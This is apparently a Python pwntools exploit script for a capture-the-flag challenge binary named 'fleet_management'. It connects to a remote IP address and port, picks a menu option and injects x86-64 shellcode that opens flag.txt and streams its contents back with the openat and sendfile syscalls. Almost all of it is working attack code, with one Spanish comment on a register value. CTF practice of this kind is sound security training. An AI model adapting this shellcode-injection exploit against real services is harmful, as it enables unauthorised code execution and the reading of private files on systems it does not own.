from pwn import *

gs = '''
break *beta_feature
continue
'''

elf = context.binary = ELF("./fleet_management")

def start():
    if args.REMOTE:
        return remote("94.237.53.113", 44375)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

shellcode = f"""
            xor  rdx, rdx
            push rdx
            mov  rsi, {u64(b"flag.txt")}
            push rsi
            mov  rsi, rsp
            xor  rdi, rdi
            sub  rdi, 100
            mov  rax, 0x101
            syscall

            mov rdi, 1
            mov rsi, rax
            mov rax, 0x28
            mov r10, 32
            syscall
"""

# r10 es el count port eso 32 sino no imprime toda la flag
# Referencia: https://x64.syscall.sh/

shellcode = asm(shellcode)
print(len(shellcode))
io.sendlineafter("do? ", b"9")

io.sendline(shellcode)

io.interactive()
